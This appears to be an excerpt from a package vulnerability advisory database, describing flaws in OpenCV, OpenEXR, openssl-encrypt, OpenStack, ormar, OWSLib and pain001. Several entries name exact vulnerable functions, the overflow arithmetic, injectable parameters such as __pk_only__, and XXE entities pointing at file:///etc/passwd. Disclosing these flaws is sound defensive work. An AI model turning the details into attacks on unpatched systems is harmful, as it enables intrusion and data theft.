In opencv/modules/imgcodecs/src/utils.cpp, functions FillUniColor and FillUniGray do not check the input length, which can lead to integer overflow. If the image is from remote, may lead to remote code execution or denial of service. This affects Opencv 3.3 (corresponding with OpenCV-Python 3.3.0.9) and earlier.

OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python and OpenCV-Contrib-Python 3.3.0.9) has an out-of-bounds write error in the FillColorRow8 function in utils.cpp when reading an image file by using cv::imread.

In opencv/modules/imgcodecs/src/grfmt_pxm.cpp, function PxMDecoder::readData has an integer overflow when calculate src_pitch. If the image is from remote, may lead to remote code execution or denial of service. This affects OpenCV 3.3 (corresponding to OpenCV-Python 3.3.0.9) and earlier.

OpenCV 3.3.1 (corresponding with opencv-python and opencv-contrib-python 3.3.1.11) has a Buffer Overflow in the cv::PxMDecoder::readData function in grfmt_pxm.cpp, because an incorrect size value is used.

openexr.advisory: OpenEXR provides the specification and reference implementation of the EXR file format, an image storage format for the motion picture industry. Version 3.3.2 is vulnerable to a heap-based buffer overflow during a read operation due to bad pointer math when decompressing DWAA-packed scan-line EXR files with a maliciously forged chunk. This is fixed in version 3.3.3.

Affected versions of the OpenEXR package are vulnerable to Denial of Service (DoS) due to excessive memory allocations. The `readScanline()` function in `ImfCheckFile.cpp` and the `EnvmapImage::resize()` function fail to validate the dataWindow coordinates from the EXR file header, leading to unbounded loops and huge memory allocations. The vulnerability was fixed by adding validation checks to prevent large allocations when dataWindow dimensions exceed reasonable limits.

OpenEXR provides the specification and reference implementation of the EXR file format, an image storage format for the motion picture industry. In version 3.3.2, when reading a deep scanline image with a large sample count in reduceMemory mode, it is possible to crash a target application with a NULL pointer dereference in a write operation. This is fixed in version 3.3.3.

Affected versions of the OpenEXR package are vulnerable to an Out-of-bounds Write due to a 32-bit integer overflow when accumulating deep sample counts, leading to an undersized heap allocation. In CompositeDeepScanLine::readPixels, attacker-influenced values added into vector<unsigned int> total_sizes and then into overall_sample_count can wrap modulo 2^32, so samples[channel].resize(overall_sample_count) allocates too small a buffer while subsequent decoding writes the true (larger) sample volume via generic_unpack_deep_pointers in src/lib/OpenEXRCore/unpack.c.

Affected versions of the OpenEXR package are vulnerable to Out-of-bounds Read and Write due to a signed 32-bit integer overflow in the PIZ decoder’s wavelet buffer pointer advancement within internal_exr_undo_piz() in internal_piz.c. The expression wavbuf += nx * ny * wcount is computed using signed int arithmetic, and a crafted EXR file can cause this product to overflow and wrap, positioning the working pointer outside the allocated scratch buffer so that subsequent wavelet decode operations in wdec14_4() read from and write to out-of-bounds heap memory. An attacker can supply a specially crafted EXR file to trigger heap memory corruption, potentially leading to process crash or further exploitation outcomes depending on allocator layout.

Affected versions of the OpenEXR package are vulnerable to a Use After Free due to improper reference counting in the legacy Python adapter. The PyObject_StealAttrString helper function in PyOpenEXR_old.cpp obtains a new reference via PyObject_GetAttrString, immediately decrements the reference count, and returns the now-dangling pointer, which callers then pass to APIs such as PyLong_AsLong and PyFloat_AsDouble. An attacker who supplies a crafted Python object as a parameter to methods like InputFile.channel() can trigger a segmentation fault or potentially achieve arbitrary code execution through heap manipulation.

Affected versions of the OpenEXR package are vulnerable to a Buffer Overflow due to an integer overflow and unchecked allocation in the legacy Python adapter. The InputFile.channel() and InputFile.channels() methods in PyOpenEXR_old.cpp compute a buffer size as typeSize * width * height without bounds checking, and the return value of the subsequent allocation is never validated before use, leading to a heap overflow on 32-bit systems or a NULL pointer dereference on 64-bit systems. An attacker who supplies a crafted EXR file with an extremely large dataWindow can trigger a crash or potentially achieve arbitrary code execution.

Affected versions of the OpenEXR package are vulnerable to Out-of-bounds Write due to a signed 32-bit integer overflow in the DWA lossy decoder’s per-component block pointer construction within internal_dwa_decoder.h. The expression numBlocksX * 64, computed as signed int, overflows for sufficiently large image widths, causing rowBlock pointers to wrap and point outside the allocated rowBlockHandle buffer, so that LossyDctDecoder_execute() subsequently writes to out-of-bounds heap memory. An attacker can supply a crafted DWAA-compressed EXR file to trigger heap memory corruption during decompression, potentially leading to process crash or further exploitation.

Affected versions of the openexr package are vulnerable to Out-of-bounds Write due to a signed integer overflow in the uncompress_b44_impl() function within internal_b44.c, where the row pointer arithmetic y * nx is computed using int types that overflow when the channel width is sufficiently large. The overflow causes the row pointers row0 through row3 to wrap to addresses before the scratch buffer, and subsequent memcpy() calls write decoded B44 pixel blocks to these invalid locations, producing a heap-based out-of-bounds write. An attacker can craft a malicious B44 or B44A EXR file that, when decoded via exr_decoding_run(), triggers a crash or potentially corrupts adjacent heap allocations.

Affected versions of the openexr package are vulnerable to Information Disclosure due to the undo_pxr24_impl() function in internal_pxr24.c ignoring the actual decompressed size returned by exr_uncompress_buffer() and instead reading from the scratch buffer based on the header-derived expected size, combined with exr_uncompress_buffer() in compression.c treating LIBDEFLATE_SHORT_OUTPUT as a successful result rather than an error. When a crafted PXR24 EXR file contains a valid but truncated zlib stream, the decompressor writes fewer bytes than expected to the scratch buffer while the subsequent byte-plane reconstruction loop reads the full expected size, incorporating uninitialised heap memory into the output pixel data. An attacker can craft a malicious EXR file that, when decoded under default settings, leaks sensitive heap memory contents through the rendered pixel output.

OpenEXR provides the specification and reference implementation of the EXR file format, an image storage format for the motion picture industry. In versions 3.3.2 through 3.3.0, there is a heap-based buffer overflow during a write operation when decompressing ZIPS-packed deep-scan-line EXR files with a maliciously forged chunk header. This is fixed in version 3.3.3.

Affected versions of the OpenEXR package are vulnerable to Use of Uninitialised Memory due to insufficient post-decode validation of scratch buffers allocated during tile and scanline processing. The generic_unpack function in the decoding pipeline reads from a heap-allocated pixel buffer that was never fully populated by the preceding decode step, causing conditional branches to depend on uninitialized values. An attacker who supplies a crafted EXR file can trigger undefined behavior, potentially resulting in a crash and Denial of Service.

Affected versions of the OpenEXR package are vulnerable to a Heap Buffer Overflow due to a signed-to-unsigned integer conversion error in the memory-mapped stream reading path. The istream_nonparallel_read function in ImfContextInit.cpp computes a clamped read size by subtracting the projected end offset from the stream size, but when the projected end exceeds the stream size, the result is a negative int64_t value that is implicitly converted to a massive size_t value and passed to memcpy. An attacker who supplies a crafted EXR file can trigger an out-of-bounds heap read, resulting in a crash and Denial of Service.

openssl-encrypt.advisory:
Affected versions of the OpenSSL-encrypt package are vulnerable to a cryptographic weakness due to predictable salt derivation in multi-round KDF operations. In multi_hash_password() and generate_key(), each round’s salt was computed deterministically as sha256(base_salt + round_number), making multi-round hashing/KDF salts precomputable from plaintext metadata.
https://gitlab.rm-rf.ch/world/openssl_encrypt/-/commit/1bb285c40432af0051f5c5f451760863d9874f7f

Affected versions of the openssl-encrypt package are vulnerable to Insertion of Sensitive Information into Log File due to refresh tokens being accepted as URL query parameters on the keyserver and telemetry server refresh endpoints. The refresh_token route handlers at openssl_encrypt_server/modules/keyserver/routes.py:214-215 and openssl_encrypt_server/modules/telemetry/routes.py:90-91 bind the refresh_token value via FastAPI Query(...), causing the token to appear in server access logs, proxy and CDN logs, browser history, HTTP Referer headers, and network monitoring tools. An attacker with access to any of these log or telemetry sinks can harvest valid refresh tokens and reuse them to obtain fresh authentication credentials for the affected service.

Affected versions of the openssl-encrypt package are vulnerable to Information Disclosure due to the /ready endpoint returning full database exception details in its response to unauthenticated callers. The readiness check handler in server.py catches database exceptions and passes the raw exception string via str(e) directly into the HTTP response body without sanitisation. An unauthenticated attacker can query the /ready endpoint to obtain sensitive internal details such as database hostnames, IP addresses, connection parameters, port numbers, and potentially database credentials embedded in connection string errors.

Affected versions of the openssl-encrypt package are vulnerable to Improper Verification of Cryptographic Signature due to the PublicKeyBundle.from_dict() method creating key bundles from untrusted data without verifying the signature. The from_dict() method in key_bundle.py constructs PublicKeyBundle objects without signature validation, and the to_identity() method can convert these unverified bundles directly into Identity objects used for encryption. An attacker can supply a crafted key bundle containing their own public key, causing the victim to encrypt sensitive data against the attacker-controlled key and thereby leaking secrets.

Affected versions of the openssl-encrypt package are vulnerable to insufficiently random/predictable salt derivation (CWE-330) due to deriving multi-round KDF round salts deterministically from plaintext metadata. The multi_hash_password() and generate_key() multi-round paths reuse a predictable per-round salt schedule (instead of an unpredictable chain), so the full sequence of round salts can be computed without knowing the password.
https://github.com/jahlives/openssl_encrypt/commit/1bb285c40432af0051f5c5f451760863d9874f7f

Affected versions of the openssl-encrypt package are vulnerable to Improper Input Validation due to schema validation being silently skipped when required validation conditions are not met. In openssl_encrypt/modules/json_validator.py, the validate_against_schema() logic returns without enforcing validation when the jsonschema library is unavailable, and metadata using unknown format versions can also bypass schema checks entirely, while schemas permit arbitrary extra fields through additionalProperties: true.

Affected versions of the openssl-encrypt package are vulnerable to Insecure Randomness due to the use of a non-cryptographic pseudo-random number generator for steganography pixel selection. The generate_pseudorandom_sequence() function in openssl_encrypt/plugins/steganography/core/utils.py uses Python’s random module with random.seed(seed) and random.sample(...), while also deriving the seed from only 8 bytes of a SHA-256 hash and storing the steganography password as a plain Python string, which makes the selection sequence insufficiently unpredictable for a security-sensitive context.

Affected versions of the openssl-encrypt package are vulnerable to Improper Input Validation due to TOTP brute-force rate-limiting state being stored only in per-process memory rather than shared, persistent storage. The vulnerability exists in openssl_encrypt_server/modules/pepper/totp.py, where TOTPRateLimiter stores attempt and lockout data in in-memory structures and TOTPService uses a class-level _rate_limiter, causing each worker to maintain independent state and all limits to be reset on restart.

Affected versions of the openssl-encrypt package are vulnerable to Uncontrolled Search Path Element due to unsafe dynamic loading of shared object files using a broad glob pattern without integrity verification. In openssl_encrypt/modules/registry/hash_registry.py, the Whirlpool loader searches site.getsitepackages() for files matching whirlpool*py313*.so, selects the first match returned by glob.glob(), and loads it with ExtensionFileLoader and importlib.util.spec_from_file_location() without verifying that the module is authentic.

Affected versions of the openssl-encrypt package are vulnerable to Information Disclosure due to exposure of plaintext passwords through command-line arguments. The openssl_encrypt/modules/crypt_cli_subparser.py module defines the --password (-p) argument at lines 150-154 and also exposes --keystore-password, causing secrets supplied on the command line to be visible through process inspection mechanisms such as ps aux or /proc/[pid]/cmdline.

Affected versions of the openssl-encrypt package are vulnerable to Missing Authorization due to the revoke_key method in the keyserver service failing to verify that the requesting client owns the key being revoked. The revoke_key method in openssl_encrypt_server/modules/keyserver/service.py accepts a client_id parameter but never checks it against key.owner_client_id before processing the revocation request. An authenticated attacker who possesses a valid revocation signature can revoke any other client's key, disrupting cryptographic operations for other users.

Affected versions of the openssl-encrypt package are vulnerable to CORS Misconfiguration due to both the key-server and telemetry-server configuring CORSMiddleware with wildcard origins combined with allow_credentials=True. The CORSMiddleware setup in main.py for both servers defaults allow_origins to a wildcard while simultaneously enabling allow_credentials, allow_methods, and allow_headers with wildcards, creating the most permissive CORS policy possible. An attacker can host a malicious website that makes fully credentialed cross-origin requests to the API on behalf of any authenticated user who visits it, enabling unauthorised actions.

Affected versions of the openssl-encrypt package are vulnerable to weak key derivation / precomputation (rainbow-table) attacks due to predictable salt derivation in multi-round KDF mode. The multi-round KDF/key material generation logic in openssl_encrypt/modules/crypt_core.py uses a deterministic per-round derivation (e.g., hashing salt + round_index) for legacy formats, allowing all round salts to be computed from plaintext metadata; this was fixed by switching v7 and v9+ to secure chained derivation in commit 0bb5bf8d981481831e047130d621b05919a72c24.
https://github.com/jahlives/openssl_encrypt/commit/0bb5bf8d981481831e047130d621b05919a72c24

openstack-cyborg.advisory: Affected versions of the openstack-cyborg package are vulnerable to Improper Access Control due to the Accelerator Request (ARQ) API failing to enforce project ownership. The project_id column in the database is never populated, database queries lack project filtering, and the authorize_wsgi policy decorator compares the caller’s project_id against itself rather than the target resource. An attacker with any authenticated non-admin account can delete or manipulate ARQs belonging to other projects’ instances, resulting in cross-tenant Denial of Service.

Affected versions of the openstack-cyborg package are vulnerable to Improper Authorisation due to multiple API endpoints using rule:allow (with check_str='@') as the default policy, which unconditionally authorises any request carrying a valid Keystone token regardless of the caller's roles, project membership, or token scope. The policy evaluation layer makes no distinction between users with legitimate administrative privileges and users with zero role assignments, allowing any authenticated principal — including a user with no role assignments whatsoever — to invoke privileged operations such as reprogramming FPGA bitstreams on arbitrary compute nodes via agent RPC.

openstack-heat.advisory:
Openstack-heat 20.0.0 includes a fix for CVE-2023-1625: An information leak was discovered in OpenStack heat. This issue could allow a remote, authenticated attacker to use the 'stack show' command to reveal parameters which are supposed to remain hidden. This has a low impact to the confidentiality, integrity, and availability of the system.
https://github.com/openstack/heat/commit/a49526c278e52823080c7f3fcb72785b93fd4dcb

Affected versions of the openstack-heat package are vulnerable to Information Disclosure due to an incomplete fix for CVE-2023-1625 that persists when the hidden feature is enabled. The `stack abandon` command with `hidden=True` still exposes sensitive information because the patch intended to remediate the earlier vulnerability was not fully applied. An attacker with low-privileged network access can exploit this by invoking `stack abandon hidden=True` to retrieve confidential details, potentially breaching confidentiality within the OpenStack orchestration environment.

OpenStack Orchestration API (Heat) 2013.2 through 2013.2.3 and 2014.1, when creating the stack for a template using a provider template, allows remote authenticated users to obtain the provider template URL via the resource-type-list.

The ReST API in OpenStack Orchestration API (Heat) before Havana 2013.2.1 and Icehouse before icehouse-2 allows remote authenticated users to bypass the tenant scoping restrictions via a modified tenant_id in the request path.

The cloudformation-compatible API in OpenStack Orchestration API (Heat) before Havana 2013.2.1 and Icehouse before icehouse-2 does not properly enforce policy rules, which allows local in-instance users to bypass intended access restrictions and (1) create a stack via the CreateStack method or (2) update a stack via the UpdateStack method.

openstack-keystone.advisory: An issue was discovered in OpenStack Keystone before 15.0.1, and 16.0.0. The EC2 API doesn't have a signature TTL check for AWS Signature V4. An attacker can sniff the Authorization header, and then use it to reissue an OpenStack token an unlimited number of times.

An issue was discovered in OpenStack Keystone before 15.0.1, and 16.0.0. Any authenticated user can create an EC2 credential for themselves for a project that they have a specified role on, and then perform an update to the credential user and project, allowing them to masquerade as another user. This potentially allows a malicious user to act as the admin on a project another user has the admin role on, which can effectively grant that user global admin privileges.

An issue was discovered in OpenStack Keystone before 15.0.1, and 16.0.0. The list of roles provided for an OAuth1 access token is silently ignored. Thus, when an access token is used to request a keystone token, the keystone token contains every role assignment the creator had for the project. This results in the provided keystone token having more role assignments than the creator intended, possibly giving unintended escalated access. See: CVE-2020-12690.

An issue was discovered in OpenStack Keystone before 15.0.1, and 16.0.0. Any user authenticated within a limited scope (trust/oauth/application credential) can create an EC2 credential with an escalated permission, such as obtaining admin while the user is on a limited viewer role. This potentially allows a malicious user to act as the admin on a project another user has the admin role on, which can effectively grant that user global admin privileges.

OpenStack Keystone 15.0.0 and 16.0.0 are affected by Data Leakage in the list credentials API. Any user with a role on a project is able to list any credentials with the /v3/credentials API when enforce_scope is false. Users with a role on a project are able to view any other users' credentials, which could (for example) leak sign-on information for Time-based One Time Passwords (TOTP). Deployments with enforce_scope set to false are affected. (There will be a slight performance impact for the list credentials API once this issue is fixed.) See: CVE-2019-19687.
HTTPSConnections in OpenStack Keystone 2013, OpenStack Compute 2013.1, and possibly other OpenStack components, fail to validate server-side SSL certificates. See: CVE-2013-2255.

It is possible to remotely trigger a crash in Keystone by sending an extremely long password. When Keystone is validating the password, glibc allocates space on the stack for the entire password. If the password is long enough, stack space can be exhausted, resulting in a crash. This vulnerability is mitigated by a patch to impose a reasonable limit on password length (4 kB). Reportedly, all versions are affected. See also: CVE-2012-1572 and https://security.openstack.org/ossa/OSSA-2012-002.html.

openstack-magnum.advisory: OpenStack Magnum passes OpenStack credentials into the Heat templates creating its instances. While these should just be used for retrieving the instances' SSL certificates, they allow full API access, though and can be used to perform any API operation the user is authorized to perform.

openstef.advisory: Openstef 3.1.1 upgrades its mlflow dependency, moving from the compatible release version of approximately 1.22.0 (=1.22.0) to approximately 1.24.0 (=1.24.0), in response to the security vulnerability CVE-2023-1176.

opentaxii.advisory: opentaxii 0.1.11 requires recent version of `lxml` for security reasons.

opentelemetry-instrumentation.advisory:
Opentelemetry-instrumentation 0.41b0 includes a fix for CVE-2023-43810: Autoinstrumentation out of the box adds the label 'http_method' that has unbound cardinality. It leads to the server's potential memory exhaustion when many malicious requests are sent. HTTP method for requests can be easily set by an attacker to be random and long. In order to be affected program has to be instrumented for HTTP handlers and does not filter any unknown HTTP methods on the level of CDN, LB, previous middleware, etc.
https://github.com/open-telemetry/opentelemetry-python-contrib/security/advisories/GHSA-5rv5-6h4r-h22v

opentera.advisory:
Opentera 1.0.9 adds missing service access checks to the Service API.
https://github.com/introlab/opentera/commit/4aa0361f6cd3faa395df6a43755fd197677c5528

Opentera version 1.2.6 addresses a configuration issue in nginx where services using dynamically specified ports in the URL were not restricted to certain ranges. This could potentially allow attackers to access other internal ports. The update resolves this by cleaning up the nginx configuration, specifically removing settings related to external services to restrict the URL-specified port to only the necessary ranges for each service.

openviking.advisory: Affected versions of this package are vulnerable to Path Traversal. The `CodeRepositoryParser._extract_zip()` method uses `zipfile.extractall()` without validating member paths, allowing files to be written outside the intended directory during extraction. An attacker can exploit this vulnerability by crafting a malicious zip archive containing entries with path traversal sequences or absolute paths to write arbitrary files to the filesystem (Zip Slip).

Affected versions of the OpenViking package are vulnerable to Missing Authorisation due to task polling endpoints that accept requests without any authentication or authorisation checks. The /api/v1/tasks and /api/v1/tasks/{task_id} routes do not enforce access controls, permitting unauthenticated callers to enumerate background task metadata created by other users, including task type, task status, resource identifiers, archive URIs, result payloads, and error information. An unauthenticated remote attacker can retrieve this metadata across tenants, enabling Information Disclosure and cross-tenant interference in multi-tenant deployments.

openzeppelin-cairo-contracts.advisory:
### Impact
This vulnerability affects all accounts (vanilla and ethereum flavors) in the [v0.2.0 release of OpenZeppelin Contracts for Cairo](https://github.com/OpenZeppelin/cairo-contracts/releases/tag/v0.2.0), which are not whitelisted on StarkNet mainnet, so only goerli deployments of v0.2.0 accounts are affected.

This faulty behavior is not observed in [StarkNet's testing framework](https://github.com/starkware-libs/cairo-lang/blob/master/src/starkware/starknet/testing/starknet.py), so don't rely on it passing to detect this issue on custom accounts.

### Patches
This bug has been patched in [v0.2.1](https://github.com/OpenZeppelin/cairo-contracts/releases/tag/v0.2.1).

### References
The issue is detailed in https://github.com/OpenZeppelin/cairo-contracts/issues/386.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [the Contracts for Cairo repo](https://github.com/OpenZeppelin/cairo-contracts/issues/new/choose)
* Email us at [security@openzeppelin.com](mailto:security@openzeppelin.com)

### Cause
`is_valid_eth_signature` is missing a call to `finalize_keccak` after calling `verify_eth_signature`. 

### Impact
As a result, any contract using `is_valid_eth_signature` from the account library (such as the `EthAccount` preset) is vulnerable to a malicious sequencer. Specifically, the malicious sequencer would be able to bypass signature validation to impersonate an instance of these accounts.

### Risk
In order to exploit this vulnerability, it is required to control a sequencer or prover since they're the ones executing the hints, being able to inject incorrect keccak results.

Today StarkWare is the only party running both a prover or a sequencer, greatly reducing the risk of exploit.

### Patches
The issue has been patched in 0.6.1.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [the Contracts for Cairo repository](https://github.com/OpenZeppelin/cairo-contracts/issues/new/choose)
* Email us at [security@openzeppelin.com](mailto:security@openzeppelin.com)

ormar.advisory: Ormar 0.10.9 updates the 'pydantic' library to fix a security vulnerability (CVE-2021-29510).

Affected versions of this package are vulnerable to Improper Input Validation. The `NewBaseModel.__init__` method pops `__pk_only__` and `__excluded__` directly from user-supplied `**kwargs` before any validation occurs. Injecting `__pk_only__=True` bypasses all Pydantic validation — including type checks, `max_length` constraints, `choices` enforcement, required-field checks, and all `@field_validator` and `@model_validator` decorators — and persists unvalidated data directly to the database. Injecting `__excluded__` silently sets arbitrary fields to `None` during construction. An attacker can exploit this by including either parameter in a JSON request body in any endpoint that passes user-controlled data to the ormar model constructor, including the canonical FastAPI + ormar pattern recommended in official documentation.

Affected versions of the ormar package are vulnerable to Improper Input Validation due to internal constructor control flags being accepted from user-supplied keyword arguments. The vulnerability exists in NewBaseModel.__init__, which pops __pk_only__ and __excluded__ from **kwargs before Pydantic validation runs, allowing the normal self.__pydantic_validator__.validate_python(...) path to be skipped and permitting arbitrary fields to be set to None during _process_kwargs.

Affected versions of the ormar package are vulnerable to SQL Injection due to passing user-supplied column names into raw SQL text without validation. In ormar, QuerySet.min() and QuerySet.max() pass the attacker-controlled columns argument through _query_aggr_function() into SelectAction.get_text_clause(), which calls sqlalchemy.text(f"{alias}{self.field_name}") and then wraps it with sqlalchemy.func.min()/sqlalchemy.func.max(), allowing arbitrary SQL expressions to be embedded in the generated query.

ouroboros-ai.advisory: Affected versions of the ouroboros-ai package are vulnerable to Remote Code Execution due to untrusted .env files in the project directory being able to override execution-affecting environment variables. Variables such as OUROBOROS_CLI_PATH and OPENCODE_CLI_PATH are loaded from the current working directory without restriction, allowing a malicious repository to redirect CLI adapter instantiation to an attacker-controlled script. An attacker can craft a repository containing a malicious .env file and executable payload, achieving arbitrary code execution when a user clones the repository and runs any Ouroboros command.

owslib.advisory: OWSLib is a Python package for client programming with Open Geospatial Consortium (OGC) web service interface standards, and their related content models. OWSLib's XML parser (which supports both 'lxml' and 'xml.etree') does not disable entity resolution, and could lead to arbitrary file reads from an attacker-controlled XML payload. This affects all XML parsing in the codebase. This issue has been addressed in version 0.28.1. The only known workaround is to patch the library manually. See 'GHSA-8h9c-r582-mggc' for details.

An XML external entity (XXE) injection in PyWPS before 4.4.5 allows an attacker to view files on the application server filesystem by assigning a path to the entity. OWSLib 0.24.1 may also be affected.

oxidize-pdf.advisory: Affected versions of the oxidize-pdf package are vulnerable to Denial of Service due to insufficient validation of colour component values in the content-stream emitter. The Color enum exposes public tuple-struct variants (Rgb, Gray, Cmyk) that allow direct construction bypassing the clamping logic in the Color::rgb, Color::gray, and Color::cmyk constructors, permitting NaN or infinity values to propagate into PDF content streams. This produces non-numeric tokens in PDF colour operators, causing downstream PDF readers to reject the output document.

The vulnerability stems from insufficient input sanitization when handling and displaying regex patterns. The commit fix partially addresses this vulnerability by introducing escaping mechanisms and input validation

pain001.advisory: Affected versions of this package are vulnerable to SQL Injection. The `load_db_data.py` module fails to properly quote SQL identifiers (table and column names) in database queries, leading to SQL injection attacks when user-controlled values are used as table or column names, enabling arbitrary SQL command execution.

Affected versions of this package are vulnerable to XML External Entity (XXE) attacks due to the use of unsafe XML parsing methods. The package uses `xml.etree.ElementTree` for XML creation and validation, which is susceptible to XXE attacks, XML bomb attacks, and other XML-based vulnerabilities. An attacker can exploit this vulnerability by crafting malicious XML data that, when processed by the application, could lead to unauthorized access to sensitive data or Denial of Service (DoS).

Affected versions of this package are vulnerable to XML External Entity (XXE) Injection. The application uses xml.etree.ElementTree for XML parsing operations without disabling external entity processing, leading to XXE attacks, XML bomb denial of service, and unauthorized DTD retrieval when processing untrusted XML input. An attacker can exploit this vulnerability by submitting crafted XML documents containing external entity declarations that reference local files (e.g., file:///etc/passwd), remote URLs for SSRF attacks, or recursive entity definitions (billion laughs attack) that cause resource exhaustion, enabling information disclosure, server-side request forgery, or denial of service.
